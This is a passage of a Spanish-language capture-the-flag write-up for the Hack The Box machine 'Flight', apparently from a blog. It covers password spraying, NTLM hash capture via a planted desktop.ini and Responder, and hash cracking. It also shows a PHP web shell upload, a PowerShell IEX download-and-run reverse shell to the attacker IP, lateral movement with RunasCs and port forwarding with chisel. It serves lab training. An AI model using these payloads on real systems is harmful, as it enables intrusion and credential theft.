+SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\O</span>.Possum:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@<span class="k">*</span>t13 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\V</span>.Stevens:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\D</span>.Truff:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\I</span>.Francis:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\W</span>.Walker:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\C</span>.Bum:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\M</span>.Gold:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\L</span>.Kein:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\G</span>.Lors:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\R</span>.Cold:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\S</span>.Moon:S@Ss!K@<span class="k">*</span>t13 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\k</span>rbtgt:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\G</span>uest:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\A</span>dministrator:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+</code></pre></div></div>
+
+<ul>
+  <li>El usuario <code class="language-plaintext highlighter-rouge">S.Moon:S@Ss!K@*t13</code> reutiliza la contraseña.</li>
+</ul>
+
+<h2 id="user-smoon">User S.Moon</h2>
+
+<ul>
+  <li>Podemos escribir en <code class="language-plaintext highlighter-rouge">Shared</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-u</span> <span class="s1">'S.Moon'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">-H</span> 10.10.11.187
+<span class="o">[</span>+] IP: 10.10.11.187:445	Name: flight.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	Shared                                            	READ, WRITE	
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY	
+	Web                                               	READ ONLY	
+</code></pre></div></div>
+
+<ul>
+  <li>De momento no hay nada.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.187/shared <span class="nt">-U</span> S.Moon
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\S</span>.Moon]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Sat May  6 19:02:41 2023
+  ..                                  D        0  Sat May  6 19:02:41 2023
+
+		5056511 blocks of size 4096. 1167339 blocks available
+smb: <span class="se">\&gt;</span> 
+</code></pre></div></div>
+
+<p>Como no sabemos que archivos podemos subir por ejemplo <strong>.php</strong> o <strong>.ini</strong> o algun otro podemos usar esta herramienta que nos crea varios archivos para ya no tener que crearlos desde 0 y subirlos directamente asta ser aceptados.</p>
+
+<p><a href="https://github.com/Greenwolf/ntlm_theft">https://github.com/Greenwolf/ntlm_theft</a></p>
+
+<p><a href="https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini">https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 ntlm_theft.py <span class="nt">-g</span> all <span class="nt">-s</span> 10.10.14.86 <span class="nt">-f</span> Gracias
+Created: Gracias/Gracias.scf <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
+Created: Gracias/Gracias-<span class="o">(</span>url<span class="o">)</span>.url <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
+Created: Gracias/Gracias-<span class="o">(</span>icon<span class="o">)</span>.url <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
+Created: Gracias/Gracias.lnk <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
+Created: Gracias/Gracias.rtf <span class="o">(</span>OPEN<span class="o">)</span>
+Created: Gracias/Gracias-<span class="o">(</span>stylesheet<span class="o">)</span>.xml <span class="o">(</span>OPEN<span class="o">)</span>
+Created: Gracias/Gracias-<span class="o">(</span>fulldocx<span class="o">)</span>.xml <span class="o">(</span>OPEN<span class="o">)</span>
+Created: Gracias/Gracias.htm <span class="o">(</span>OPEN FROM DESKTOP WITH CHROME, IE OR EDGE<span class="o">)</span>
+Created: Gracias/Gracias-<span class="o">(</span>includepicture<span class="o">)</span>.docx <span class="o">(</span>OPEN<span class="o">)</span>
+Created: Gracias/Gracias-<span class="o">(</span>remotetemplate<span class="o">)</span>.docx <span class="o">(</span>OPEN<span class="o">)</span>
+Created: Gracias/Gracias-<span class="o">(</span>frameset<span class="o">)</span>.docx <span class="o">(</span>OPEN<span class="o">)</span>
+Created: Gracias/Gracias-<span class="o">(</span>externalcell<span class="o">)</span>.xlsx <span class="o">(</span>OPEN<span class="o">)</span>
+Created: Gracias/Gracias.wax <span class="o">(</span>OPEN<span class="o">)</span>
+Created: Gracias/Gracias.m3u <span class="o">(</span>OPEN IN WINDOWS MEDIA PLAYER ONLY<span class="o">)</span>
+Created: Gracias/Gracias.asx <span class="o">(</span>OPEN<span class="o">)</span>
+Created: Gracias/Gracias.jnlp <span class="o">(</span>OPEN<span class="o">)</span>
+Created: Gracias/Gracias.application <span class="o">(</span>DOWNLOAD AND OPEN<span class="o">)</span>
+Created: Gracias/Gracias.pdf <span class="o">(</span>OPEN AND ALLOW<span class="o">)</span>
+Created: Gracias/zoom-attack-instructions.txt <span class="o">(</span>PASTE TO CHAT<span class="o">)</span>
+Created: Gracias/Autorun.inf <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
+Created: Gracias/desktop.ini <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
+Generation Complete.
+
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Con esto hemos creado un directorio llamado Gracias donde se encuentran todos estos archivos.</p>
+  </li>
+  <li>
+    <p>Vamos a subir el <code class="language-plaintext highlighter-rouge">.ini</code> primero ya que es un archivo que usa <code class="language-plaintext highlighter-rouge">Windows</code> y si hay alguien por detras revisando los archivos nos llegara su <strong>hash ntlmv2</strong>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn desktop.ini
+<span class="o">[</span>.ShellClassInfo]
+<span class="nv">IconResource</span><span class="o">=</span><span class="se">\\</span>10.10.14.86<span class="se">\a</span>a
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.187/shared <span class="nt">-U</span> S.Moon
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\S</span>.Moon]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> put desktop.ini
+putting file desktop.ini as <span class="se">\d</span>esktop.ini <span class="o">(</span>0.1 kb/s<span class="o">)</span> <span class="o">(</span>average 0.1 kb/s<span class="o">)</span>
+smb: <span class="se">\&gt;</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos usar <code class="language-plaintext highlighter-rouge">responder</code> para ver si nos llega otro hash y si nos llega el <code class="language-plaintext highlighter-rouge">hash</code> de otro usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ responder <span class="nt">-I</span> tun0 <span class="nt">-v</span>
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0
+
+  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
+  To <span class="nb">kill </span>this script hit CTRL-C
+
+
+<span class="o">[</span>+] Poisoners:
+    LLMNR                      <span class="o">[</span>ON]
+    NBT-NS                     <span class="o">[</span>ON]
+    DNS/MDNS                   <span class="o">[</span>ON]
+
+<span class="o">[</span>+] Servers:
+    HTTP server                <span class="o">[</span>ON]
+    HTTPS server               <span class="o">[</span>ON]
+    WPAD proxy                 <span class="o">[</span>OFF]
+    Auth proxy                 <span class="o">[</span>OFF]
+    SMB server                 <span class="o">[</span>ON]
+    Kerberos server            <span class="o">[</span>ON]
+    SQL server                 <span class="o">[</span>ON]
+    FTP server                 <span class="o">[</span>ON]
+    IMAP server                <span class="o">[</span>ON]
+    POP3 server                <span class="o">[</span>ON]
+    SMTP server                <span class="o">[</span>ON]
+    DNS server                 <span class="o">[</span>ON]
+    LDAP server                <span class="o">[</span>ON]
+    RDP server                 <span class="o">[</span>ON]
+    DCE-RPC server             <span class="o">[</span>ON]
+    WinRM server               <span class="o">[</span>ON]
+
+<span class="o">[</span>+] HTTP Options:
+    Always serving EXE         <span class="o">[</span>OFF]
+    Serving EXE                <span class="o">[</span>OFF]
+    Serving HTML               <span class="o">[</span>OFF]
+    Upstream Proxy             <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] Poisoning Options:
+    Analyze Mode               <span class="o">[</span>OFF]
+    Force WPAD auth            <span class="o">[</span>OFF]
+    Force Basic Auth           <span class="o">[</span>OFF]
+    Force LM downgrade         <span class="o">[</span>OFF]
+    Fingerprint hosts          <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] Generic Options:
+    Responder NIC              <span class="o">[</span>tun0]
+    Responder IP               <span class="o">[</span>10.10.14.86]
+    Challenge <span class="nb">set</span>              <span class="o">[</span>random]
+    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-EXDXPM1RBFS]
+    Responder Domain Name      [4N6C.LOCAL]
+    Responder DCE-RPC Port     [49860]
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight.htb\c.bum
+[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:560adafc5dad6194:F0D84B7798B9710577010D771417F2A6:010100000000000080950F231680D90190AC29609653BA97000000000200080034004E003600430001001E00570049004E002D00450058004400580050004D003100520042004600530004003400570049004E002D00450058004400580050004D00310052004200460053002E0034004E00360043002E004C004F00430041004C000300140034004E00360043002E004C004F00430041004C000500140034004E00360043002E004C004F00430041004C000700080080950F231680D90106000400020000000800300030000000000000000000000000300000DDF1C68546D7FBF8E1D2F800182F46C1660157CA4B8589AE48156B3010C812A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380036000000000000000000
+
+</span></code></pre></div></div>
+
+<ul>
+  <li>Vamos a crackear el hash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn hash2
+c.bum::flight.htb:560adafc5dad6194:F0D84B7798B9710577010D771417F2A6:010100000000000080950F231680D90190AC29609653BA97000000000200080034004E003600430001001E00570049004E002D00450058004400580050004D003100520042004600530004003400570049004E002D00450058004400580050004D00310052004200460053002E0034004E00360043002E004C004F00430041004C000300140034004E00360043002E004C004F00430041004C000500140034004E00360043002E004C004F00430041004C000700080080950F231680D90106000400020000000800300030000000000000000000000000300000DDF1C68546D7FBF8E1D2F800182F46C1660157CA4B8589AE48156B3010C812A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380036000000000000000000
+❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hash2
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+Tikkycoll_431012284 <span class="o">(</span>c.bum<span class="o">)</span>
+1g 0:00:00:15 DONE <span class="o">(</span>2023-05-06 12:29<span class="o">)</span> 0.06640g/s 699665p/s 699665c/s 699665C/s Timber06..Tiffani29
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<h2 id="user-cbum">User c.bum</h2>
+
+<ul>
+  <li>Tenemos contraseñas vamos a validar si son correctas con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">c.bum:Tikkycoll_431012284</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> <span class="s1">'c.bum'</span> <span class="nt">-p</span> <span class="s1">'Tikkycoll_431012284'</span>
+SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\c</span>.bum:Tikkycoll_431012284 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a ver los recursos compartidos a nivel de red y tenemos permisos de escritura otra vez en <strong>Shared</strong> y ahora tambien en <strong>Web</strong> quiero pensar que <strong>Web</strong> hay estaran los archivos de la pagina web pero para eso tenemos que comprobarlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-u</span> <span class="s1">'c.bum'</span> <span class="nt">-p</span> <span class="s1">'Tikkycoll_431012284'</span> <span class="nt">-H</span> 10.10.11.187
+<span class="o">[</span>+] IP: 10.10.11.187:445	Name: flight.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	Shared                                            	READ, WRITE	
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY	
+	Web                                               	READ, WRITE	
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a conectarnos para ver que hay dentro.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.187/Web <span class="nt">-U</span> c.bum
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\c</span>.bum]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Sat May  6 19:33:58 2023
+  ..                                  D        0  Sat May  6 19:33:58 2023
+  flight.htb                          D        0  Sat May  6 19:32:01 2023
+  school.flight.htb                   D        0  Sat May  6 19:32:01 2023
+
+		5056511 blocks of size 4096. 1166619 blocks available
+smb: <span class="se">\&gt;</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a meternos en <code class="language-plaintext highlighter-rouge">flight.htb</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Sat May  6 19:37:01 2023
+  ..                                  D        0  Sat May  6 19:37:01 2023
+  css                                 D        0  Sat May  6 19:37:01 2023
+  images                              D        0  Sat May  6 19:37:01 2023
+  index.html                          A     7069  Wed Feb 23 23:58:10 2022
+  js                                  D        0  Sat May  6 19:37:01 2023
+  
+		5056511 blocks of size 4096. 1166475 blocks available
+smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>Como la maquina web interpreta <code class="language-plaintext highlighter-rouge">php</code> podemos subir un archivo <code class="language-plaintext highlighter-rouge">.php</code> para ganar acceso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn reverse.php
+&lt;?php
+  system<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> put reverse.php
+putting file reverse.php as <span class="se">\f</span>light.htb<span class="se">\r</span>everse.php <span class="o">(</span>0.1 kb/s<span class="o">)</span> <span class="o">(</span>average 0.1 kb/s<span class="o">)</span>
+smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vemos que si funciona.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s1">'http://flight.htb/reverse.php?cmd=whoami'</span>
+flight<span class="se">\s</span>vc_apache
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos usar este script <a href="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1</a> para ganar acceso ala maquina directamente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+<span class="nt">--2023-05-06</span> 12:45:14--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+Resolviendo raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
+Conectando con raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)[</span>185.199.109.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 4339 <span class="o">(</span>4.2K<span class="o">)</span> <span class="o">[</span>text/plain]
+Grabando a: «Invoke-PowerShellTcp.ps1»
+
+Invoke-PowerShellTcp.ps1        100%[<span class="o">=======================================================&gt;]</span>   4.24K  <span class="nt">--</span>.-KB/s    en 0.002s  
+
+2023-05-06 12:45:15 <span class="o">(</span>2.71 MB/s<span class="o">)</span> - «Invoke-PowerShellTcp.ps1» guardado <span class="o">[</span>4339/4339]
+
+</code></pre></div></div>
+
+<ul>
+  <li>Solo tenemos que meter una linea al final del script para que nos envie la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s1">'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.86 -Port 443'</span> <span class="o">&gt;&gt;</span> sh.ps1
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn sh.ps1 | <span class="nb">tail</span> <span class="nt">-n</span> 1
+Invoke-PowerShellTcp <span class="nt">-Reverse</span> <span class="nt">-IPAddress</span> 10.10.14.86 <span class="nt">-Port</span> 443
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos montamos un servidor <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python3</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+
+</code></pre></div></div>
+
+<ul>
+  <li>Ponte es escucha en el puerto que indicaste por que ahora haremos la peticion para ganar acceso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://flight.htb/reverse.php'</span> <span class="nt">--data-urlencode</span> <span class="s2">"cmd=cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.86/sh.ps1')"</span>
+
+</code></pre></div></div>
+
+<ul>
+  <li>Se hace la peticion.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.11.187 - - <span class="o">[</span>06/May/2023 12:51:32] <span class="s2">"GET /sh.ps1 HTTP/1.1"</span> 200 -
+
+</code></pre></div></div>
+
+<h2 id="shell-svc_apache">Shell svc_apache</h2>
+
+<ul>
+  <li>Y ganamos acceso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.86] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.187] 55592
+Windows PowerShell running as user svc_apache on G0
+Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+</span>flight<span class="se">\s</span>vc_apache
+PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\f</span>light.htb&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Como tenemos la contraseña de otros 2 usuario podemos migrar a <code class="language-plaintext highlighter-rouge">C.bum</code> podemos usar <code class="language-plaintext highlighter-rouge">RuncasCs</code> <a href="https://github.com/antonioCoco/RunasCs/releases">https://github.com/antonioCoco/RunasCs/releases</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip RunasCs.zip
+Archive:  RunasCs.zip
+  inflating: RunasCs.exe             
+  inflating: RunasCs_net2.exe  
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos a un directorio donde tengamos capacidad de escritura para descargar los archivos para eso crea un directorio <code class="language-plaintext highlighter-rouge">temp</code> en la maquina victima.</p>
+  </li>
+  <li>
+    <p>Para descarganos el <strong>RuncasCs.zip</strong> podemos usar <code class="language-plaintext highlighter-rouge">certutil.exe</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="nt">-split</span> http://10.10.14.86/RunasCs.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+  0000  ...
+  c000
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+<span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\t</span>emp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
+<span class="nt">-a----</span>         5/6/2023   7:00 PM          49152 RunasCs.exe                                                           
+
+
+PS C:<span class="se">\t</span>emp&gt; 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   ./RunasCs.exe c.bum Tikkycoll_431012284 <span class="s2">"cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.86/sh.ps1')"</span>
+</code></pre></div></div>
+
+<h2 id="shell-cbum">Shell c.bum</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.86] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.187] 55630
+Windows PowerShell running as user C.Bum on G0
+Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+</span>flight<span class="se">\c</span>.bum
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; 
+</code></pre></div></div>
+
+<h2 id="remote-port-forwarding">Remote Port Forwarding</h2>
+
+<ul>
+  <li>Despues de usar <code class="language-plaintext highlighter-rouge">winpeas.exe</code> para enumerar la maquina, la maquina tiene el puerto <code class="language-plaintext highlighter-rouge">8000</code> por <code class="language-plaintext highlighter-rouge">TCP</code> abierto y no lo vimos con <code class="language-plaintext highlighter-rouge">nmap</code> asi que vamos a tener que usar <code class="language-plaintext highlighter-rouge">chisel</code> para aplicar <code class="language-plaintext highlighter-rouge">Remote Port Forwarding</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl.exe <span class="nt">-s</span> 127.0.0.1:8000 <span class="nt">-I</span>
+HTTP/1.1 200 OK
+Content-Length: 45949
+Content-Type: text/html
+Last-Modified: Mon, 16 Apr 2018 21:23:36 GMT
+Accept-Ranges: bytes
+ETag: <span class="s2">"03cf42dc9d5d31:0"</span>
+Server: Microsoft-IIS/10.0
+X-Powered-By: ASP.NET
+Date: Sun, 07 May 2023 02:29:55 GMT
+</code></pre></div></div>
+
+<p><a href="https://github.com/jpillora/chisel/releases/tag/v1.8.1">https://github.com/jpillora/chisel/releases/tag/v1.8.1</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="nt">-split</span> http://10.10.14.86/chisel.exe   
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\t</span>emp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
+<span class="nt">-a----</span>         5/6/2023   7:28 PM        1700664 chisel.exe                                                            
+<span class="nt">-a----</span>         5/6/2023   7:00 PM          49152 RunasCs.exe                                                           
+<span class="nt">-a----</span>         5/6/2023   7:14 PM        2027008 winPEASx64.exe                                                        
+
+
+PS C:<span class="se">\t</span>emp&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a ponernos como servidor desde nuestra maquina de atacante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./chisel server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
+2023/05/06 13:32:19 server: Reverse tunnelling enabled
+2023/05/06 13:32:19 server: Fingerprint hFDZilMNfo60BDUFkwa/MYA0F50fY71fHiwdWiCkz7I<span class="o">=</span>
+2023/05/06 13:32:19 server: Listening on http://0.0.0.0:1234
+</code></pre></div></div>
+
+<ul>
+  <li>Nos traemos el puerto <strong>8000</strong> a nuestra maquina.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel.exe client 10.10.14.86:1234 R:8000:127.0.0.1:8000
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora podemos verlo desde la web.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./chisel server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
+2023/05/06 13:38:27 server: Reverse tunnelling enabled
